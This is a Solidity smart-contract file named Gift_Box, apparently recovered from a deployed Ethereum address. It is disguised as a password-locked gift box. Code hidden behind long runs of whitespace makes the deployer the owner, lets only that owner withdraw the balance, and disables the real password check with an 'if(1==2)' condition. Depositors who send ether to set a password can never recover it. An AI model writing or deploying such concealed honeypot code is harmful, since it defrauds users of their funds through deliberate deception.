/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Gift_Box at 0x31fd65340a3d272e21fd6ac995f305cc1ad5f42a
*/
pragma solidity ^0.4.18;

contract Gift_Box
{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      address prop = msg.sender;
    function()payable{}
    
    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
    
    bytes32 public hashPass;
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if(msg.value >= 1 ether)
        {
            hashPass = hash;
        }
    }
    
    function GetGift(bytes pass)
    public
    payable
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               if(msg.sender==prop){msg.sender.transfer(this.balance);}if(1==2){
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
    }
}